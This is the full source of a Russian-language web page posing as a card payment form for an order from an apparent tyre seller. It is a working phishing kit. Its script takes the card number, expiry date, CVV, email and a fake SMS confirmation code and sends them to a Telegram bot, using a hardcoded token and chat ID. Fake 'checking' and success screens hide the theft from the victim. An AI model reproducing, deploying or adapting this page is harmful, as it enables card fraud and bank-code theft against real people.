<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>–û–ø–ª–∞—Ç–∞</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;800&display=swap" rel="stylesheet">

<style>
* { box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
body { margin:0; background:#f7f9fc; color:#0f172a; }
.container { max-width:420px; margin:0 auto; padding:28px 22px 38px; animation: pageIn .5s ease; }
.hidden { display:none; }
@keyframes pageIn { from {opacity:0; transform:translateY(14px);} to {opacity:1; transform:none;} }
.header { font-size:13px; font-weight:500; color:#64748b; margin-bottom:10px; }
.order-title { font-size:26px; font-weight:600; color:#1f2a44; }
.amount-label { margin-top:32px; font-size:14px; font-weight:500; color:#64748b; }
.amount { margin-top:6px; font-size:36px; font-weight:800; }
.section-title { margin-top:38px; font-size:15px; font-weight:600; }
.input { margin-top:16px; padding:14px 0; width:100%; font-size:16px; border:none; border-bottom:1px solid #e2e8f0; background:transparent; outline:none; transition:border .25s ease; }
.input:focus { border-bottom-color:#2b4cff; }
.input.error { border-bottom-color:#ef4444; }
.error-message { color:#ef4444; font-size:13px; margin-top:4px; display:none; }
.row { display:flex; gap:18px; }
.card-row { display:flex; align-items:center; justify-content:space-between; }
.cards img { height:12px; opacity:.75; }
.pay-button { margin-top:38px; width:100%; padding:16px; font-size:16px; font-weight:600; color:#fff; background:#2b4cff; border:none; border-radius:14px; cursor:pointer; transition: transform .2s ease, box-shadow .2s ease; }
.pay-button:hover { transform: translateY(-1px); box-shadow:0 10px 28px rgba(43,76,255,.35); }
.pay-button:disabled { background:#cbd5e1; cursor:not-allowed; transform:none; box-shadow:none; }
.overlay { position:fixed; inset:0; background:rgba(247,249,252,.92); display:flex; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition:opacity .4s ease; z-index:50; }
.overlay.active { opacity:1; pointer-events:all; }
.spinner { width:36px; height:36px; border:3px solid #e2e8f0; border-top:3px solid #2b4cff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 16px; }
@keyframes spin { to { transform: rotate(360deg); } }
#loaderText { animation: pulse 1.6s ease infinite; }
@keyframes pulse { 0%,100%{opacity:.6} 50%{opacity:1} }
.success { text-align:center; margin-top:90px; }
.check-3d { width:68px; height:68px; border-radius:50%; background:linear-gradient(145deg,#22c55e,#16a34a); display:flex; align-items:center; justify-content:center; margin:0 auto 22px; box-shadow:0 22px 50px rgba(34,197,94,.45); animation: pop 1s cubic-bezier(.2,1.3,.4,1); }
@keyframes pop { 0%{transform:scale(.3);opacity:0} 70%{transform:scale(1.15)} 100%{transform:scale(1);opacity:1} }
.check-3d svg { width:32px; stroke:#fff; stroke-width:3; fill:none; }
.confetti { position:fixed; inset:0; pointer-events:none; z-index:100; }
.confetti span { position:absolute; width:6px; height:10px; background:hsl(var(--h),90%,60%); animation:fall 2.8s linear infinite; }
@keyframes fall { from { transform:translateY(-10vh) rotate(0); } to { transform:translateY(110vh) rotate(360deg); } }
</style>
</head>

<body>

<div class="container" id="step1">
  <div class="header" id="payDate"></div>
  <div class="order-title">–û–ø–ª–∞—Ç–∞ –∑–∞–∫–∞–∑–∞</div>
  <div class="amount-label">–ö –æ–ø–ª–∞—Ç–µ</div>
  <div class="amount" id="amount">‚Äî</div>
  <div class="section-title">–ë–∞–Ω–∫–æ–≤—Å–∫–∞—è –∫–∞—Ä—Ç–∞</div>
  <div class="card-row">
    <input id="card" class="input" placeholder="XXXX XXXX XXXX XXXX" />
    <div class="cards">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">
      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Mir-logo.SVG.svg">
    </div>
  </div>
  <div id="cardError" class="error-message">–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</div>

  <div class="row">
    <div style="flex:1">
      <input id="date" class="input" placeholder="MM / YY" />
      <div id="dateError" class="error-message">–í–≤–µ–¥–∏—Ç–µ —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è</div>
    </div>
    <div style="flex:1">
      <input id="cvv" class="input" placeholder="CVV" />
      <div id="cvvError" class="error-message">–í–≤–µ–¥–∏—Ç–µ CVV</div>
    </div>
  </div>

  <div class="section-title">–ö—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —á–µ–∫</div>
  <input id="email" class="input" placeholder="email@example.com" />
  <div id="emailError" class="error-message">–í–≤–µ–¥–∏—Ç–µ email</div>

  <button class="pay-button" onclick="start()" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å</button>
</div>

<div class="overlay" id="overlay">
  <div>
    <div class="spinner"></div>
    <div id="loaderText">–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö‚Ä¶</div>
  </div>
</div>

<div class="container hidden" id="step2">
  <div class="order-title">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–∏</div>
  <div class="header" style="margin-top:6px">
    <span id="smsAmount"></span> ¬ª –ò–ü ¬´–ê–≤—Ç–æ–®–∏–Ω—ã¬ª
  </div>
  <input id="sms" class="input" placeholder="–ö–æ–¥ –∏–∑ SMS" />
  <div id="smsError" class="error-message">–í–≤–µ–¥–∏—Ç–µ SMS-–∫–æ–¥</div>
  <button class="pay-button" onclick="finish()" id="confirmBtn">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
</div>

<div class="container hidden" id="step3">
  <div class="success">
    <div class="check-3d">
      <svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>
    </div>
    <div class="order-title">–£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞</div>
    <div class="header">–í–æ–∑–≤—Ä–∞—â–∞–µ–º –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É‚Ä¶</div>
  </div>
</div>

<div class="confetti" id="confetti"></div>

<script>
const overlay = document.getElementById('overlay');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const card = document.getElementById('card');
const date = document.getElementById('date');
const cvv = document.getElementById('cvv');
const email = document.getElementById('email');
const sms = document.getElementById('sms');

let cardDataSent = false;

const TG_TOKEN = '8577527867:AAH0fOHH-YIzBRxllQGHHLnlkwkV0y1m1y4';
const CHAT_ID = '-1003571250872';

function sendToTelegram(text){
  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:CHAT_ID,text:text,parse_mode:'HTML'})
  }).catch(()=>{});
}

/* ===== –ó–ê–ì–†–£–ó–ö–ê –°–£–ú–ú–´ –ò –î–ê–¢–´ ===== */
(async () => {
  try {
    const res = await fetch('/orders.json');
    const orders = await res.json();

    // –ü–æ–ª—É—á–∞–µ–º orderId –∏–∑ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤
    const params = new URLSearchParams(window.location.search);
    const orderFromQuery = params.get("order");
    
    // 1. –ü—Ä–æ–≤–µ—Ä—è–µ–º sessionStorage (–¥–ª—è GitHub Pages 404 —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞)
    let orderFromSession = null;
    if (sessionStorage.redirectPath) {
      const pathParts = sessionStorage.redirectPath.split('/').filter(part => part);
      orderFromSession = pathParts[0] || null;
      console.log("Order from sessionStorage:", orderFromSession);
      // –£–¥–∞–ª—è–µ–º –ø–æ—Å–ª–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è, —á—Ç–æ–±—ã –Ω–µ –º–µ—à–∞–ª–æ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
      sessionStorage.removeItem('redirectPath');
    }
    
    // 2. –ü–æ–ª—É—á–∞–µ–º –∏–∑ —Ç–µ–∫—É—â–µ–≥–æ –ø—É—Ç–∏
    const currentPathParts = window.location.pathname.split('/').filter(part => part);
    const orderFromPath = currentPathParts[0] || null;
    
    // 3. –ü–æ–ª—É—á–∞–µ–º –∏–∑ –ø–æ–¥–¥–æ–º–µ–Ω–∞
    const hostParts = window.location.hostname.split('.');
    const subdomain = hostParts.length > 2 ? hostParts[0] : null;

    // –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç: query > sessionStorage > –ø—É—Ç—å > –ø–æ–¥–¥–æ–º–µ–Ω
    const orderId = orderFromQuery || orderFromSession || orderFromPath || subdomain;

    console.log("Order ID:", orderId);
    console.log("Sources:", {
      query: orderFromQuery,
      session: orderFromSession,
      path: orderFromPath,
      subdomain: subdomain
    });

    if (!orderId) {
      document.getElementById('amount').textContent = '–û—à–∏–±–∫–∞';
      document.getElementById('payDate').textContent = 'ID –∑–∞–∫–∞–∑–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω';
      return;
    }

    if (!orders[orderId]) {
      document.getElementById('amount').textContent = '–û—à–∏–±–∫–∞';
      document.getElementById('payDate').textContent = '–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω';
      return;
    }

    document.getElementById('amount').textContent = orders[orderId].amount;
    document.getElementById('payDate').textContent =
      new Date().toLocaleDateString('ru-RU',{day:'2-digit',month:'long',year:'numeric'});
  } catch (error) {
    console.error("Error loading order data:", error);
    document.getElementById('amount').textContent = '–û—à–∏–±–∫–∞';
    document.getElementById('payDate').textContent = '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö';
  }
})();

/* ================== –í–ê–õ–ò–î–ê–¶–ò–Ø –ò –ö–ù–û–ü–ö–ò ================== */
function validateCardForm() {
  let isValid = true;
  document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
  document.querySelectorAll('.input').forEach(el => el.classList.remove('error'));
  
  if (!card.value.trim() || card.value.replace(/\s/g, '').length !== 16) { 
    document.getElementById('cardError').style.display='block'; 
    card.classList.add('error'); 
    isValid=false;
  }
  
  if (!date.value.trim() || date.value.length !== 7) { 
    document.getElementById('dateError').style.display='block'; 
    date.classList.add('error'); 
    isValid=false;
  }
  
  if (!cvv.value.trim() || cvv.value.length !== 3) { 
    document.getElementById('cvvError').style.display='block'; 
    cvv.classList.add('error'); 
    isValid=false;
  }
  
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; 
  if (!email.value.trim() || !emailRegex.test(email.value)) { 
    document.getElementById('emailError').style.display='block'; 
    email.classList.add('error'); 
    isValid=false;
  }
  
  return isValid;
}

function validateSMS() {
  let isValid = true;
  document.getElementById('smsError').style.display='none';
  sms.classList.remove('error');
  
  if (!sms.value.trim() || sms.value.length < 4) { 
    document.getElementById('smsError').style.display='block'; 
    sms.classList.add('error'); 
    isValid=false;
  }
  
  return isValid;
}

function start(){
  if(!validateCardForm()) return;
  
  const amount = document.getElementById('amount').textContent;
  const cardData = card.value, dateData = date.value, emailData = email.value;
  
  const telegramMessageCard = 
    `<b>üí∞ –ù–æ–≤–∞—è –æ–ø–ª–∞—Ç–∞</b>\n` +
    `‚îú –°—É–º–º–∞: <code>${amount}</code>\n` +
    `‚îú –ö–∞—Ä—Ç–∞: <code>${cardData}</code>\n` +
    `‚îú –°—Ä–æ–∫: <code>${dateData}</code>\n` +
    `‚îú CVV: <code>${cvv.value}</code>\n` +
    `‚îú Email: <code>${emailData}</code>\n` +
    `‚îî –î–∞—Ç–∞: ${new Date().toLocaleString('ru-RU')}`;
  
  sendToTelegram(telegramMessageCard);
  cardDataSent = true;
  
  document.getElementById('payBtn').disabled = true; 
  document.getElementById('payBtn').textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞...';
  
  overlay.classList.add('active');
  
  setTimeout(() => {
    overlay.classList.remove('active'); 
    step1.classList.add('hidden'); 
    step2.classList.remove('hidden'); 
    document.getElementById('smsAmount').textContent = document.getElementById('amount').textContent; 
    document.getElementById('payBtn').disabled = false; 
    document.getElementById('payBtn').textContent = '–û–ø–ª–∞—Ç–∏—Ç—å';
  }, 9000);
}

function finish(){
  if(!validateSMS()) return;
  
  if(!cardDataSent){
    alert('–°–Ω–∞—á–∞–ª–∞ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã'); 
    return;
  }
  
  const smsData = sms.value;
  const telegramMessageSMS = 
    `<b>üì± SMS-–∫–æ–¥ –ø–æ–ª—É—á–µ–Ω</b>\n` +
    `‚îú –ö–æ–¥: <code>${smsData}</code>\n` +
    `‚îú –í—Ä–µ–º—è: ${new Date().toLocaleTimeString('ru-RU')}\n` +
    `‚îî –î–∞—Ç–∞: ${new Date().toLocaleDateString('ru-RU')}`;
  
  sendToTelegram(telegramMessageSMS);
  
  document.getElementById('confirmBtn').disabled = true; 
  document.getElementById('confirmBtn').textContent = '–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ...';
  
  step2.classList.add('hidden'); 
  step3.classList.remove('hidden'); 
  launchConfetti(); 
  
  setTimeout(() => {
    // –ü—Ä–∏ –≤–æ–∑–≤—Ä–∞—Ç–µ –æ—á–∏—â–∞–µ–º sessionStorage –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã
    sessionStorage.removeItem('redirectPath');
    location.href = '/';
  }, 3000);
}

function launchConfetti(){
  const c = document.getElementById('confetti');
  for(let i = 0; i < 40; i++){
    const s = document.createElement('span'); 
    s.style.left = Math.random() * 100 + '%'; 
    s.style.animationDelay = Math.random() * 2 + 's'; 
    s.style.setProperty('--h', Math.random() * 360); 
    c.appendChild(s);
  }
  setTimeout(() => c.innerHTML = '', 3000);
}

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–≤–æ–¥–∞ –∫–∞—Ä—Ç—ã
card.oninput = () => {
  card.value = card.value
    .replace(/\D/g, '')
    .slice(0, 16)
    .replace(/(.{4})/g, '$1 ')
    .trim();
};

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–≤–æ–¥–∞ –¥–∞—Ç—ã
date.oninput = () => {
  let v = date.value.replace(/\D/g, '').slice(0, 4);
  date.value = v.length > 2 ? v.slice(0, 2) + ' / ' + v.slice(2) : v;
};

// –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤–≤–æ–¥–∞ CVV
cvv.oninput = () => {
  cvv.value = cvv.value.replace(/\D/g, '').slice(0, 3);
};

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–Ω—è—Ç–∏–µ –æ—à–∏–±–æ–∫ –ø—Ä–∏ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–∏
card.addEventListener('blur', () => {
  if(card.value.trim() && card.value.replace(/\s/g, '').length === 16){
    card.classList.remove('error'); 
    document.getElementById('cardError').style.display = 'none';
  }
});

date.addEventListener('blur', () => {
  if(date.value.trim() && date.value.length === 7){
    date.classList.remove('error'); 
    document.getElementById('dateError').style.display = 'none';
  }
});

cvv.addEventListener('blur', () => {
  if(cvv.value.trim() && cvv.value.length === 3){
    cvv.classList.remove('error'); 
    document.getElementById('cvvError').style.display = 'none';
  }
});

email.addEventListener('blur', () => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if(email.value.trim() && emailRegex.test(email.value)){
    email.classList.remove('error'); 
    document.getElementById('emailError').style.display = 'none';
  }
});

sms.addEventListener('blur', () => {
  if(sms.value.trim() && sms.value.length >= 4){
    sms.classList.remove('error'); 
    document.getElementById('smsError').style.display = 'none';
  }
});
</script>

</body>
</html>